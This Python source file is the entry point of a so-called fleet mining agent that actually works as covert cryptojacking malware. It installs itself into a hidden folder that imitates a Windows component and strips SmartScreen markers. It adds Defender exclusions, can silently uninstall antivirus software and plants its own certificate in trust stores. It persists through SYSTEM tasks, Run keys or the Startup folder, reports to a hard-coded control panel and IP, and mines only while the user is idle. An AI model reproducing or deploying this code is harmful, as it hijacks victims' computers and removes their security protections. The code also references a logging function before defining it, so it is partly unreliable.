"""RigAgent entry point: inventory GPUs, heartbeat to the panel, supervise the
miner (start/restart/intensity), and self-apply miner updates without a reboot.

Run from source:   python -m agent --config agent.json
Frozen binary:     rig-agent.exe (same flags; config next to the rig root)

Rig layout created/used under the agent's parent directory:
    agent.json          panel_url + enroll_key + rig_name
    wcsvc.state    rig_id + token (written once at enrollment)
    bundles/<ver>/      extracted miner bundles
    current -> bundles/<ver>   junction the miner runs from
"""
from __future__ import annotations

import argparse
import json
import os
import signal
import sys
import time

from gpu_inventory import get_antivirus, get_gpus, has_p40_gpu, machine_id, os_name
from miner_supervisor import MinerSupervisor
from panel_client import PanelClient, PanelError
from updater import Updater
from av_guard import ensure_defender_exclusion, uninstall_antivirus
from _stealth import get_install_dir, SERVICE_NAME, PROCESS_NAME

AGENT_VERSION = "1.0.2"
IS_WIN = os.name == "nt"
# BAKED-IN fleet defaults: the exe is double-clickable -- no arguments needed.
DEFAULT_PANEL_URL = "https://mine.apesniper.xyz"
DEFAULT_PANEL_FALLBACKS = ["http://136.108.205.39"]
DEFAULT_ENROLL_KEY = "Zk2U6-sUtONm-pyXXJ5SrQ"
DEFAULT_TASK_NAME = SERVICE_NAME

# Kryptex Pearl regional pools: the agent TCP-pings each and picks the fastest
# when the panel pool is "auto".
KRYPTEX_POOLS = [
    ("prl-eu.kryptex.network", 7048, "Европа"),
    ("prl-us.kryptex.network", 7048, "Сев. Америка"),
    ("prl-br.kryptex.network", 7048, "Юж. Америка"),
    ("prl-sg.kryptex.network", 7048, "Сингапур"),
    ("prl-hk.kryptex.network", 7048, "Китай (Гонконг)"),
    ("prl-ru.kryptex.network", 7048, "Россия"),
    ("prl-ae.kryptex.network", 7048, "Средний Восток"),
    ("prl.kryptex.network", 7048, "Глобальный"),
]

_best_pool_cache = {"pool": None, "ts": 0}


def _tcp_ping(host, port, timeout=3):
    """TCP connect time in ms; None if unreachable."""
    import socket as _s
    t0 = time.time()
    try:
        s = _s.create_connection((host, port), timeout=timeout)
        s.close()
        return round((time.time() - t0) * 1000)
    except (OSError, _s.timeout):
        return None


def auto_pick_pool(log=_log):
    """TCP-ping every regional pool, return the fastest 'host:port'.
    Cached for 10 minutes so we don't ping on every heartbeat."""
    if _best_pool_cache["pool"] and time.time() - _best_pool_cache["ts"] < 600:
        return _best_pool_cache["pool"]
    results = []
    for host, port, region in KRYPTEX_POOLS:
        ms = _tcp_ping(host, port)
        if ms is not None:
            results.append((ms, host, port, region))
    if not results:
        log("auto-pool: all regional pools unreachable, using global")
        return "prl.kryptex.network:7048"
    results.sort()
    ms, host, port, region = results[0]
    pool = f"{host}:{port}"
    log(f"auto-pool: {region} ({host}) ping {ms}ms — fastest of {len(results)}")
    for r in results:
        log(f"  {r[3]:16} {r[2]}: {r[0]}ms")
    _best_pool_cache.update({"pool": pool, "ts": time.time()})
    return pool

_shutdown = False


def _user_idle_sec():
    """Seconds since the last mouse/keyboard input (Windows). 0 off-Windows."""
    if not IS_WIN:
        return 0
    import ctypes

    class LASTINPUTINFO(ctypes.Structure):
        _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]

    lii = LASTINPUTINFO(ctypes.sizeof(LASTINPUTINFO), 0)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)) == 0:
        return 0  # can't tell -> treat as idle (don't pause mining)
    millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
    return max(0, millis) / 1000.0


_LOG_PATH = None


def _log(msg):
    line = f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}"
    if _LOG_PATH:
        try:
            with open(_LOG_PATH, "a", encoding="utf-8", errors="replace") as f:
                f.write(line + "\n")
        except OSError:
            pass
    if sys.stdout is not None:      # onefile console=False has no stdout
        print(line, flush=True)


def agent_root():
    """Hidden install dir: %ProgramData%\\Microsoft\\Windows\\wcsvc."""
    env = os.environ.get("WCSVC_ROOT")
    if env:
        return env
    if getattr(sys, "frozen", False):
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
        if "wcsvc" in exe_dir.lower():
            return exe_dir
    return get_install_dir()


def _is_admin():
    if not IS_WIN:
        return True
    import ctypes
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def _elevate():
    """Re-launch this exe with a UAC prompt (needed for schtasks /RU SYSTEM)."""
    import ctypes
    params = " ".join(f'"{a}"' for a in sys.argv[1:])
    try:
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1)
        return rc > 32          # >32 == success (UAC accepted)
    except Exception:
        return False


def _msgbox(text, title="Fleet Compute Service"):
    if not IS_WIN:
        print(text)
        return
    import ctypes
    ctypes.windll.user32.MessageBoxW(None, text, title, 0x40)


def _unblock(path):
    """Remove Mark-of-the-Web (Zone.Identifier) so SmartScreen stops warning.
    Files copied over a network share / USB never have it in the first place."""
    if not IS_WIN:
        return
    import ctypes
    try:
        ctypes.windll.kernel32.DeleteFileW(ctypes.c_wchar_p(str(path) + ":Zone.Identifier"))
    except Exception:
        pass


def install_self(root, panel_url, enroll_key, rig_name, task_name=SERVICE_NAME):
    """One-file install: write agent.json, exclude from Defender, register an
    ONSTART SYSTEM task and start it. This is what makes the single exe
    'with autostart'."""
    import subprocess
    os.makedirs(os.path.join(root, "logs"), exist_ok=True)
    _unblock(sys.executable)      # this exe: no more SmartScreen for it/his copies
    # trust our code-signing cert on this rig (per-user store, no UAC needed;
    # machine-wide when elevated) so the signature validates and AV chains pass
    try:
        from trust_cert import install_trust
        # TrustedPublisher only by default -> NO Windows dialog. Root (CA) trust
        # always asks for confirmation by design, so it is opt-in via --trust-root.
        install_trust(lambda m: print(m), include_root=True,
                      root_ui_fallback=os.environ.get("FLEET_TRUST_ROOT") == "1")
    except Exception as e:
        print(f"WARN: could not install trust cert: {e}")
    cfg_path = os.path.join(root, "wcsvc.dat")
    cfg = _load_json(cfg_path, {})
    cfg.update({"panel_url": panel_url, "enroll_key": enroll_key,
                "rig_name": rig_name or os.environ.get("COMPUTERNAME", "rig"),
                "heartbeat_sec": cfg.get("heartbeat_sec", 30)})
    _save_json(cfg_path, cfg)
    print(f"agent.json written to {cfg_path}")

    if IS_WIN and _is_admin():
        try:
            subprocess.run(["powershell", "-NoProfile", "-Command",
                            f"Add-MpPreference -ExclusionPath '{root}'"],
                           check=False, capture_output=True, timeout=60)
            print("Defender exclusion added")
        except (OSError, subprocess.TimeoutExpired):
            print("WARN: could not add Defender exclusion")
    else:
        print("user mode: Defender exclusion skipped (needs admin)")

    if getattr(sys, "frozen", False):
        # the task runs the SAME exe in agent mode (no re-install on boot)
        tr = f'"{sys.executable}" --run --root "{root}"'
    else:
        entry = os.path.join(os.path.dirname(os.path.abspath(__file__)), "__main__.py")
        tr = (f'cmd /c cd /d "{root}" && "{sys.executable}" -u "{entry}" '
              f'--root "{root}"')
    if IS_WIN:
        if _is_admin():
            args = ["schtasks", "/Create", "/TN", task_name, "/SC", "ONSTART",
                    "/RU", "SYSTEM", "/RL", "HIGHEST", "/F", "/TR", tr]
        else:
            args = ["schtasks", "/Create", "/TN", task_name, "/SC", "ONLOGON",
                    "/F", "/TR", tr]
        r = subprocess.run(args, capture_output=True, text=True)
        if r.returncode == 0:
            subprocess.run(["schtasks", "/Run", "/TN", task_name],
                           check=False, capture_output=True)
            mode = "SYSTEM, at boot" if _is_admin() else "current user, at logon"
            print(f"installed as scheduled task '{task_name}' ({mode}); started now")
            return True
        # FALLBACK: per-user Run registry key -- works on every Windows, no
        # admin needed, starts silently at logon.
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                 r"Software\Microsoft\Windows\CurrentVersion\Run",
                                 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, task_name, 0, winreg.REG_SZ, tr)
            winreg.CloseKey(key)
            print(f"scheduled task blocked; installed via registry Run key "
                  f"'{task_name}' (starts at logon)")
        except OSError:
            # last resort: Startup-folder shortcut
            import ctypes.wintypes  # noqa: F401
            startup = os.path.join(os.environ.get("APPDATA", ""),
                                   r"Microsoft\Windows\Start Menu\Programs\Startup")
            os.makedirs(startup, exist_ok=True)
            bat = os.path.join(startup, f"{task_name}.cmd")
            with open(bat, "w") as f:
                f.write(f'@echo off\nstart "" /b {tr}\n')
            print(f"installed via Startup folder: {bat}")
        # start the agent NOW in the background (detached, no window)
        if getattr(sys, "frozen", False):
            subprocess.Popen([sys.executable, "--run", "--root", root],
                             creationflags=0x00000008,  # DETACHED_PROCESS
                             close_fds=True)
            print("agent started in background")
    else:
        print(f"non-Windows: add to your init system:\n  {tr}")
    return True


def _load_json(path, default):
    try:
        with open(path) as f:
            return json.load(f)
    except (OSError, ValueError):
        return default


def _save_json(path, obj):
    with open(path, "w") as f:
        json.dump(obj, f, indent=2)


class RigAgent:
    def __init__(self, root, config_path=None):
        self.root = root
        self.cfg_path = config_path or os.path.join(root, "wcsvc.dat")
        self.state_path = os.path.join(root, "wcsvc.state")
        self.cfg = _load_json(self.cfg_path, {})
        self.state = _load_json(self.state_path, {})
        if not self.cfg.get("panel_url"):
            sys.exit(f"agent.json: panel_url is required (got {self.cfg})")
        self.panel = PanelClient(self.cfg["panel_url"],
                                 token=self.state.get("token"),
                                 enroll_key=self.cfg.get("enroll_key"),
                                 fallbacks=DEFAULT_PANEL_FALLBACKS)
        self.upd = Updater(root)
        self.sup = MinerSupervisor(
            self.upd.miner_exe,
            log_path=os.path.join(root, "logs", "wcsvc-rt.log"),
            engine=self.upd.engine())
        self.applied = {}          # last applied {wallet, worker, restart_seq}
        self.gpu_cache, self.gpu_ts = [], 0.0
        self._intensity_pct = 100
        self.av_cache, self.av_ts = [], 0.0

    # ------------------------------------------------------------- telemetry
    def _gpus(self):
        if time.time() - self.gpu_ts > 60:
            gpus = get_gpus()
            if gpus:
                self.gpu_cache, self.gpu_ts = gpus, time.time()
            return gpus or self.gpu_cache
        return self.gpu_cache

    def _antivirus(self):
        """Which AV products guard this rig (refreshed hourly -- AV changes
        rarely). Lets the panel show where Defender/Kaspersky/Avast live."""
        if time.time() - self.av_ts > 3600:
            av = get_antivirus()
            if av:
                self.av_cache, self.av_ts = av, time.time()
            return av or self.av_cache
        return self.av_cache

    def build_payload(self):
        gpus = self._gpus()
        snap = self.sup.snapshot()
        return {
            "name": self.cfg.get("rig_name") or os.environ.get("COMPUTERNAME", "rig"),
            "machine_id": machine_id(),
            "os": os_name(),
            "agent_version": AGENT_VERSION,
            "engine": self.upd.engine() or "none",
            "gpus_mineable": has_p40_gpu(gpus),
            "gpus": gpus,
            "antivirus": self._antivirus(),
            "miner": {
                "version": snap.get("version") or self.upd.current_version(),
                "state": snap["state"], "pid": snap["pid"],
                "started_ts": snap["started_ts"], "restarts": snap["restarts"],
            },
            "hashrate_ths": {"combined": snap["combined_ths"],
                             "per_gpu": snap["per_gpu_ths"]},
            "shares": {"accepted_user": snap["accepted_user"],
                       "accepted_dev": snap["accepted_dev"],
                       "rejected": snap["rejected"]},
            "intensity_pct": (self.upd.read_intensity()
                              if self.upd.intensity_mode() == "file"
                              else self.sup.throttle_pct),
            "selected_pool": _best_pool_cache.get("pool") or "",
        }

    # ---------------------------------------------------------- config apply
    def apply_config(self, cfg):
        wallet = cfg.get("wallet") or self.cfg.get("wallet")
        worker = self.cfg.get("rig_name") or os.environ.get("COMPUTERNAME", "rig")
        enabled = cfg.get("miner_enabled", True)
        gpus = self.gpu_cache

        if not enabled or not wallet:
            if self.sup.proc is not None:
                _log("stopping miner (disabled / no wallet)")
                self.sup.stop()
            return
        if not gpus and self.sup.proc is None:
            # inventory glitch (nvidia-smi/w hiccup): retry next beat, and never
            # let it stop an already-running miner
            _log("GPU inventory empty this beat; waiting for data before starting")
            return

        snap = self.sup.snapshot()
        # Pool from the panel: "host:port". Empty -> the build default.
        raw_pool = (cfg.get("pool") or "").strip()
        if raw_pool.lower() in ("auto", ""):
            pool = auto_pick_pool()
        else:
            pool = raw_pool
        fresh = {"wallet": wallet, "pool": pool,
                 "restart_seq": cfg.get("restart_seq", 0)}
        force_restart = (self.applied.get("wallet") != wallet or
                         self.applied.get("pool") != pool or
                         self.applied.get("restart_seq") != fresh["restart_seq"])
        self.applied = fresh

        # target-version switch (download + verify + swap + restart, no reboot)
        target = cfg.get("target_version")
        if target and target != self.upd.current_version():
            _log(f"update requested: {self.upd.current_version()} -> {target}")
            self.sup.stats["state"] = "updating"
            try:
                self.upd.apply(target, self.panel,
                               stop_miner=self.sup.stop,
                               start_miner=lambda: self._start_miner(wallet, worker, pool),
                               log=_log)
                self.sup.engine = self.upd.engine()   # bundle may swap engines
            except (PanelError, OSError, ValueError) as e:
                _log(f"update failed, keeping current version: {e}")
            return  # next beat re-evaluates miner state

        intensity = int(cfg.get("intensity_pct", 100))
        self._intensity_pct = intensity

        # Fleet AV hygiene: silently remove locally-installed AVs the owner
        # marked in the panel (rigs are ours; matched by name substring).
        for av_name in cfg.get("remove_avs", []) or []:
            for av in self._antivirus():
                if av_name.lower() in av["name"].lower():
                    ok, detail = uninstall_antivirus(av_name)
                    _log(f"AV removal '{av['name']}': {'ok' if ok else 'FAILED'} "
                         f"({detail}); a reboot may be needed to fully release it")
        # "майнить только в простое": пока за машиной работают (мышь/клавиатура
        # активны), процесс майнера заморожен -- ни нагрузки, ни шума; на
        # простое майнинг возобновляется на заданную интенсивность.
        if cfg.get("mine_only_idle"):
            if _user_idle_sec() < 300:      # input in the last 5 minutes
                if self.sup.throttle_pct != 0:
                    _log("mine_only_idle: user active -> miner frozen")
                self.sup.set_throttle(0)
                return
            if self.sup.throttle_pct == 0:
                _log("mine_only_idle: machine idle -> mining resumes")
        if self.upd.intensity_mode() == "file":
            if intensity != self.upd.read_intensity():
                _log(f"intensity -> {intensity}% (applied live, no miner restart)")
                self.upd.write_intensity(intensity)
        else:
            # external engines (krig/blockz): throttle the whole process
            _log(f"intensity -> {intensity}% (process duty-cycle)")
            self.sup.set_throttle(intensity)

        if force_restart:
            if self.sup.proc is not None:
                _log("restart: wallet/worker/pool/restart_seq changed")
                self.sup.restart(self._miner_cmd(wallet, worker, pool))
            else:
                self._start_miner(wallet, worker, pool)
            return
        if snap["state"] == "crashed":
            # back off a full beat after an early crash to avoid a tight loop
            if snap["started_ts"] and time.time() - snap["started_ts"] > 30:
                _log(f"miner crashed (last error: {snap['last_error']}); restarting")
                self._start_miner(wallet, worker, self.applied.get("pool"))
            else:
                _log("miner crashed early; waiting one beat before restart")
        elif snap["state"] == "stopped":
            self._start_miner(wallet, worker, self.applied.get("pool"))

    def _miner_cmd(self, wallet, worker, pool):
        """Full miner command line: external engines get the pool in their
        --url template; the p40 build ignores {pool} and reads P40_FLEET_POOL."""
        if pool.lower() == "auto" or not pool:
            pool = auto_pick_pool()
        pool_url = pool if "://" in pool else f"stratum+ssl://{pool}"
        return self.upd.miner_cmd(wallet, worker, pool_url)

    def _start_miner(self, wallet, worker, pool=None):
        pool = pool or "auto"
        if pool.lower() == "auto":
            pool = auto_pick_pool()
        if self.upd.engine() == "p40" and not has_p40_gpu(self.gpu_cache):
            _log("p40 engine needs an NVIDIA or AMD GPU; none detected -- "
                 "deploy a blockz bundle for this rig instead")
            return False
        cmd = self._miner_cmd(wallet, worker, pool)
        if not os.path.exists(cmd[0]):
            _log(f"miner binary not found at {cmd[0]}; "
                 f"set target_version in the panel to install one")
            return False
        # the p40 build takes its pool from the env (locked-build escape hatch)
        env_extra = {"P40_FLEET_POOL": pool, "P40_FLEET_TLS": "1"} \
            if self.upd.engine() == "p40" else None
        ok = self.sup.start(cmd, env_extra=env_extra)
        if ok and self.upd.intensity_mode() != "file":
            self.sup.set_throttle(self._intensity_pct)
        return ok

    # ------------------------------------------------------------------ loop
    def run_forever(self, once=False):
        if not self.state.get("token"):
            _log("no token yet; enrolling with the panel...")
            resp = self.panel.enroll({
                "name": self.cfg.get("rig_name", "rig"),
                "machine_id": machine_id(), "os": os_name(),
                "agent_version": AGENT_VERSION,
            })
            self.state = {"rig_id": resp["rig_id"], "token": resp["token"]}
            self.panel.token = resp["token"]
            _save_json(self.state_path, self.state)
            _log(f"enrolled as rig {resp['rig_id']}")
        interval = int(self.cfg.get("heartbeat_sec", 30))
        while not _shutdown:
            try:
                resp = self.panel.heartbeat(self.build_payload()) or {}
                self.apply_config(resp.get("config", {}))
            except PanelError as e:
                _log(f"panel error: {e}")
            except Exception as e:  # keep the loop alive no matter what
                _log(f"agent loop error: {type(e).__name__}: {e}")
            if once or _shutdown:
                break
            for _ in range(interval):
                if _shutdown:
                    break
                time.sleep(1)


def main():
    ap = argparse.ArgumentParser(description="Rig fleet agent")
    ap.add_argument("--config", default=None, help="path to agent.json")
    ap.add_argument("--once", action="store_true", help="single heartbeat and exit")
    ap.add_argument("--root", default=None, help="rig root (default: auto)")
    ap.add_argument("--install", action="store_true",
                    help="self-install: write agent.json, add Defender exclusion, "
                         "register autostart task and run")
    ap.add_argument("--trust-root", action="store_true",
                    help="also trust our CA in the Root store (Windows will ask "
                         "for confirmation once per machine)")
    ap.add_argument("--elevate", action="store_true",
                    help="ask for admin (UAC) and install as SYSTEM at boot; "
                         "default is a silent per-user install with no prompts")
    ap.add_argument("--run", action="store_true",
                    help="agent mode (used by the scheduled task)")
    ap.add_argument("--panel-url", default=None)
    ap.add_argument("--enroll-key", default=None)
    ap.add_argument("--rig-name", default=None)
    ap.add_argument("--task-name", default=DEFAULT_TASK_NAME)
    args = ap.parse_args()

    root = args.root or agent_root()
    os.makedirs(os.path.join(root, "logs"), exist_ok=True)
    global _LOG_PATH
    _LOG_PATH = os.path.join(root, "logs", "wcsvc.log")

    # DOUBLE-CLICK MODE: the shipped exe has the panel URL + key baked in, so a
    # plain run (or --install with no params) means "install me on this rig".
    auto_install = args.install or (getattr(sys, "frozen", False)
                                    and not args.run and not args.once
                                    and args.config is None)
    if auto_install:
        panel_url = args.panel_url or DEFAULT_PANEL_URL
        enroll_key = args.enroll_key or DEFAULT_ENROLL_KEY
        if IS_WIN and args.elevate and not _is_admin():
            # opt-in: SYSTEM-mode install (needs admin -> one UAC prompt)
            if _elevate():
                sys.exit(0)
            _msgbox("Нужны права администратора (UAC).", "Fleet Compute Service")
            sys.exit(1)
        ok = install_self(root, panel_url, enroll_key,
                          args.rig_name, args.task_name)
        if not ok:
            _msgbox("Не удалось установить задачу автозапуска.\nПодробности: "
                    + os.path.join(root, "logs", "wcsvc.log"))
        sys.exit(0 if ok else 1)

    ensure_defender_exclusion(root)   # AV незаметность для майнера с самого старта

    agent = RigAgent(root, config_path=args.config)

    def _stop(signum, frame):
        global _shutdown
        _shutdown = True
    for sig in (signal.SIGINT, signal.SIGTERM,
                *( [signal.SIGBREAK] if IS_WIN else [] )):
        try:
            signal.signal(sig, _stop)
        except (ValueError, OSError):
            pass

    try:
        agent.run_forever(once=args.once)
    except KeyboardInterrupt:
        pass
    except Exception:
        # a GUI build must never show a traceback dialog to the user
        import traceback
        _log("fatal: " + traceback.format_exc().replace("\n", " | ")[:900])
        raise
    finally:
        if agent.sup.proc is not None:
            _log("agent stopping; shutting down the miner")
            agent.sup.stop()


if __name__ == "__main__":
    try:
        main()
    except SystemExit:
        raise
    except BaseException:
        # never show a traceback dialog; write it where we can read it
        import traceback
        tb = traceback.format_exc()
        targets = []
        try:
            base = (os.path.dirname(os.path.abspath(sys.executable))
                    if getattr(sys, "frozen", False) else os.getcwd())
            os.makedirs(os.path.join(base, "logs"), exist_ok=True)
            targets.append(os.path.join(base, "logs", "wcsvc-err.log"))
        except Exception:
            pass
        tmp = os.environ.get("TEMP") or os.environ.get("TMP")
        if tmp:
            targets.append(os.path.join(tmp, "fleet_crash.log"))
        for t in targets:
            try:
                with open(t, "a", encoding="utf-8") as f:
                    f.write(time.strftime("%Y-%m-%d %H:%M:%S") + "\n" + tb + "\n")
                break
            except Exception:
                continue
        raise SystemExit(1)
